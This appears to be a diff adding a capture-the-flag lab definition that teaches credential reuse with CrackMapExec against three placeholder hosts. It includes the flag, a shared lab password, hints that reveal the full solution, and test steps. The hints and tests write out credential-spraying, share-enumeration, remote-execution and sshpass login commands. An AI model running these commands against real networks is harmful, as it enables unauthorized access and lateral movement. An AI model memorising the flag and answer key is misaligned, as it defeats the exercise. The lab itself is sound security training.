@@ -1,0 +1,401 @@
+name: CME Credential Reuse Automation
+description: Use CrackMapExec to automate credential testing across FinanceCorp's infrastructure, demonstrating efficient lateral movement techniques.
+difficulty: intermediate
+category: credential-attacks
+duration_minutes: 120
+objectives:
+  - Understand what CrackMapExec is and when to use it
+  - Compare manual credential testing vs CME automation
+  - Use CME to test credentials across multiple protocols (SMB, RDP, WinRM)
+  - Use CME to test credentials across multiple targets
+  - Understand CME's credential database feature
+  - Capture the flag
+
+scenario: |
+  Your manual credential reuse testing for FinanceCorp has revealed extensive lateral 
+  movement opportunities. James Mitchell wants to understand how attackers use 
+  automation tools like CrackMapExec to efficiently test credentials across large 
+  infrastructures.
+  
+  CrackMapExec (CME) automates credential testing across multiple protocols and targets, 
+  making it a powerful tool for lateral movement. FinanceCorp needs to understand how 
+  automation amplifies credential reuse risks.
+  
+  Your objective: Use CrackMapExec to automate credential testing across FinanceCorp's 
+  infrastructure. Test credentials across multiple protocols (SMB, RDP, WinRM) and 
+  multiple targets to demonstrate efficient lateral movement techniques.
+
+
+flag: "OCR{cme_smb_cr3d3nt14l_t3st}"
+
+hints:
+  - id: 1
+    unlock_after_minutes: 0
+    text: |
+      ## Understanding CrackMapExec and Credential Automation
+
+      **CrackMapExec (CME)** is a post-exploitation tool designed to automate
+      security assessments of large Active Directory networks. It is one of the
+      most powerful tools for **credential testing at scale**.
+
+      ### Why Automation Matters
+
+      In previous labs, you tested credentials manually against one target at
+      a time. In real enterprise networks, there may be hundreds or thousands
+      of hosts. Manual testing is:
+      - **Slow** - testing one host at a time
+      - **Error-prone** - easy to miss hosts
+      - **Inconsistent** - different tools for different protocols
+
+      CME solves all of these by automating credential testing across:
+      - **Multiple protocols** (SMB, SSH, RDP, WinRM, LDAP, MSSQL)
+      - **Multiple targets** simultaneously
+      - **Multiple credentials** (username/password lists)
+
+      ### This Lab's Setup - Three Separate Targets
+
+      This lab has **three independent target machines**:
+
+      | Target | Service | Port | Flag Location |
+      |--------|---------|------|---------------|
+      | `<target1>` | SMB | 445 | `/tmp/private/flag.txt` |
+      | `<target2>` | RDP | 3389 | `/home/admin/flag.txt` |
+      | `<target3>` | SSH | 22 | `/home/admin/flag.txt` |
+
+      All three targets use the same credentials: `admin:password123`
+
+      ### Your Goal
+
+      Use CrackMapExec to efficiently test credentials across all three
+      targets and protocols, then retrieve the flag from target3 via SSH.
+
+  - id: 2
+    unlock_after_minutes: 5
+    text: |
+      ## CrackMapExec (CME) - Tool Deep Dive
+
+      ### Installation
+      ```bash
+      sudo apt install crackmapexec
+      ```
+
+      ### Basic Syntax
+      ```bash
+      crackmapexec <protocol> <target(s)> -u <user> -p <password> [options]
+      ```
+
+      ### Supported Protocols
+
+      | Protocol | Port | Command |
+      |----------|------|---------|
+      | SMB | 445 | `crackmapexec smb` |
+      | SSH | 22 | `crackmapexec ssh` |
+      | RDP | 3389 | `crackmapexec rdp` |
+      | WinRM | 5985 | `crackmapexec winrm` |
+      | LDAP | 389 | `crackmapexec ldap` |
+      | MSSQL | 1433 | `crackmapexec mssql` |
+
+      ### Target Specification
+
+      CME accepts targets in multiple formats:
+      ```bash
+      # Single IP
+      crackmapexec smb <target_ip>
+
+      # Multiple IPs (space-separated)
+      crackmapexec smb <target1> <target2> <target3>
+
+      # CIDR range
+      crackmapexec smb <subnet>/24
+
+      # File containing targets
+      crackmapexec smb targets.txt
+      ```
+
+      ### Key CME Options
+
+      | Option | Purpose |
+      |--------|---------|
+      | `-u <user>` | Username |
+      | `-p <pass>` | Password |
+      | `-x <cmd>` | Execute command (requires admin) |
+      | `--shares` | List SMB shares |
+      | `--users` | Enumerate users |
+      | `--pass-pol` | Get password policy |
+      | `-M <module>` | Run a CME module |
+
+      ### Output Indicators
+
+      - `[+]` - Successful authentication
+      - `[-]` - Failed authentication
+      - `[*]` - Informational message
+
+  - id: 3
+    unlock_after_minutes: 10
+    text: |
+      ## Practical CME Examples for Multi-Target Testing
+
+      ### Step 1: Scan All Targets
+      ```bash
+      # Scan target1 (SMB)
+      nmap -sV -p 445 <target1>
+
+      # Scan target2 (RDP)
+      nmap -sV -p 3389 <target2>
+
+      # Scan target3 (SSH)
+      nmap -sV -p 22 <target3>
+      ```
+
+      ### Step 2: Test SMB Credentials Across All Targets
+      ```bash
+      # Test SMB on all three targets at once
+      crackmapexec smb <target1> <target2> <target3> -u admin -p password123
+      ```
+
+      Expected output:
+      ```
+      SMB  <target1>  445  TARGET1  [+] admin:password123
+      SMB  <target2>  445  TARGET2  [-] admin:password123
+      SMB  <target3>  445  TARGET3  [-] admin:password123
+      ```
+
+      Only target1 has SMB running, so only it shows `[+]`.
+
+      ### Step 3: Test SSH Credentials
+      ```bash
+      crackmapexec ssh <target1> <target2> <target3> -u admin -p password123
+      ```
+
+      Expected: Only target3 shows `[+]` (SSH on port 22).
+
+      ### Step 4: Test RDP Credentials
+      ```bash
+      crackmapexec rdp <target1> <target2> <target3> -u admin -p password123
+      ```
+
+      Expected: Only target2 shows `[+]` (RDP on port 3389).
+
+      ### Step 5: Enumerate SMB Shares on Target1
+      ```bash
+      crackmapexec smb <target1> -u admin -p password123 --shares
+      ```
+
+      Expected output:
+      ```
+      SMB  <target1>  445  TARGET1  [+] admin:password123
+      SMB  <target1>  445  TARGET1  [+] Enumerated shares
+      SMB  <target1>  445  TARGET1  Share    Permissions  Remark
+      SMB  <target1>  445  TARGET1  private  READ,WRITE
+      ```
+
+  - id: 4
+    unlock_after_minutes: 15
+    text: |
+      ## Step-by-Step CME Automation Workflow
+
+      ### Phase 1: Reconnaissance
+      ```bash
+      # Scan all three targets for all relevant ports
+      nmap -sV -p 22,445,3389 <target1> <target2> <target3>
+      ```
+
+      Map which services run on which targets:
+      - target1: SMB (445)
+      - target2: RDP (3389)
+      - target3: SSH (22)
+
+      ### Phase 2: Automated Credential Testing with CME
+
+      Test the credentials against each protocol:
+      ```bash
+      # Test SMB on target1
+      crackmapexec smb <target1> -u admin -p password123
+
+      # Test RDP on target2
+      crackmapexec rdp <target2> -u admin -p password123
+
+      # Test SSH on target3
+      crackmapexec ssh <target3> -u admin -p password123
+      ```
+
+      All three should show `[+]` indicating successful authentication.
+
+      ### Phase 3: SMB Share Enumeration (Target1)
+      ```bash
+      # List shares
+      crackmapexec smb <target1> -u admin -p password123 --shares
+
+      # You should see a "private" share
+      ```
+
+      ### Phase 4: Flag Retrieval from Target3 (SSH)
+
+      The flag is on target3, accessible via SSH:
+      ```bash
+      # Connect via SSH
+      ssh admin@<target3>
+      # Password: password123
+      cat /home/admin/flag.txt
+      ```
+
+      ### Phase 5: Command Execution via CME (Alternative)
+      ```bash
+      # Execute commands on target3 via SSH
+      crackmapexec ssh <target3> -u admin -p password123 -x "cat /home/admin/flag.txt"
+      ```
+
+  - id: 5
+    unlock_after_minutes: 20
+    text: |
+      ## Exact Commands to Solve This Lab
+
+      ### 1. Scan All Targets
+      ```bash
+      nmap -sV -p 22,445,3389 <target1> <target2> <target3>
+      ```
+
+      ### 2. Test Credentials with CME
+      ```bash
+      crackmapexec smb <target1> -u admin -p password123
+      crackmapexec rdp <target2> -u admin -p password123
+      crackmapexec ssh <target3> -u admin -p password123
+      ```
+
+      ### 3. Enumerate SMB Shares on Target1
+      ```bash
+      crackmapexec smb <target1> -u admin -p password123 --shares
+      ```
+
+      ### 4. Connect via SSH to Target3 and Read the Flag
+      ```bash
+      ssh admin@<target3>
+      # Password: password123
+      cat /home/admin/flag.txt
+      ```
+
+      ### Alternative: CME Command Execution
+      ```bash
+      # Read flag from target3 via CME
+      crackmapexec ssh <target3> -u admin -p password123 \
+        -x "cat /home/admin/flag.txt"
+      ```
+
+      ### Alternative: SSH One-Liner
+      ```bash
+      ssh admin@<target3>
+      # Password: password123
+      cat /home/admin/flag.txt
+      ```
+
+      ### Alternative: RDP to Target2
+      ```bash
+      xfreerdp /v:<target2> /u:admin /p:password123 /cert:ignore
+      # In terminal: cat /home/admin/flag.txt
+      ```
+
+      ### Using a Targets File
+      ```bash
+      # Create a targets file
+      echo -e "<target1>\n<target2>\n<target3>" > targets.txt
+
+      # Test all at once
+      crackmapexec smb targets.txt -u admin -p password123
+      crackmapexec ssh targets.txt -u admin -p password123
+      ```
+
+      The **primary flag** to submit is from target3 via SSH.
+
+  - id: 6
+    unlock_after_minutes: 25
+    text: |
+      ## Complete Solution Walkthrough
+
+      ### Full Command Sequence
+
+      ```bash
+      # Step 1: Scan all targets
+      nmap -sV -p 22,445,3389 <target1> <target2> <target3>
+      # Output:
+      #   <target1>: 445/tcp open netbios-ssn Samba
+      #   <target2>: 3389/tcp open ms-wbt-server xrdp
+      #   <target3>: 22/tcp open ssh OpenSSH
+
+      # Step 2: CME credential testing - SMB
+      crackmapexec smb <target1> -u admin -p password123
+      # Output: SMB  <target1>  445  [+] admin:password123
+
+      # Step 3: CME credential testing - RDP
+      crackmapexec rdp <target2> -u admin -p password123
+      # Output: RDP  <target2>  3389  [+] admin:password123
+
+      # Step 4: CME credential testing - SSH
+      crackmapexec ssh <target3> -u admin -p password123
+      # Output: SSH  <target3>  22  [+] admin:password123
+
+      # Step 5: Enumerate shares on target1
+      crackmapexec smb <target1> -u admin -p password123 --shares
+      # Output: Shows "private" share with READ access
+
+      # Step 6: Connect via SSH to target3 and read the flag
+      ssh admin@<target3>
+      # Password: password123
+      # cat /home/admin/flag.txt
+      # Output: OCR{...}
+      ```
+
+      ### Multi-Target Summary
+
+      | Target | Service | Port | Credential Test | Flag Location |
+      |--------|---------|------|-----------------|---------------|
+      | `<target1>` | SMB | 445 | `[+] admin:password123` | `/tmp/private/flag.txt` |
+      | `<target2>` | RDP | 3389 | `[+] admin:password123` | `/home/admin/flag.txt` |
+      | `<target3>` | SSH | 22 | `[+] admin:password123` | `/home/admin/flag.txt` |
+
+      ### CME vs Manual Testing Comparison
+
+      | Aspect | Manual | CME Automated |
+      |--------|--------|---------------|
+      | Speed | Slow (one at a time) | Fast (parallel) |
+      | Consistency | Varies by tool | Same syntax for all |
+      | Scalability | Impractical at scale | Handles hundreds of hosts |
+      | Documentation | Manual notes | Structured output |
+
+      ### Key Takeaways
+
+      - CrackMapExec automates credential testing across multiple protocols
+        and targets with a consistent interface
+      - The same credentials `admin:password123` worked on all three targets
+        running different services (SMB, RDP, SSH)
+      - CME's `--shares` flag quickly enumerates accessible SMB shares
+      - CME's `-x` flag enables remote command execution
+      - In real assessments, CME can test thousands of hosts in minutes,
+        making it essential for enterprise-scale credential reuse testing
+      - The flag from target3 via SSH is the primary submission
+      - Submit the flag value in the format `OCR{...}`
+
+credentials:
+  - username: "admin"
+    password: "password123"
+    role: "admin"
+    description: "admin credentials"
+
+workbook: "wiki/range/winpt/CH08_Credential_Reuse/05_CME_Credential_Reuse_Automation/"
+
+test:
+  steps:
+    - name: "Verify SMB service is running on target1"
+      command: "nmap -sV -p 445 {target.target1}"
+      expect: "445/tcp"
+
+    - name: "Verify SSH service is running on target3"
+      command: "nmap -sV -p 22 {target.target3}"
+      expect: "22/tcp"
+
+    - name: "Verify SMB credentials on target1 with crackmapexec"
+      command: "crackmapexec smb {target.target1} -u {cred.admin.user} -p {cred.admin.pass} 2>&1"
+      expect: "+"
+
+    - name: "Retrieve flag from target3 via SSH credential reuse"
+      command: "sshpass -p '{cred.admin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.admin.user}@{target.target3} 'cat /home/admin/flag.txt' 2>/dev/null"
+      expect: "OCR{"
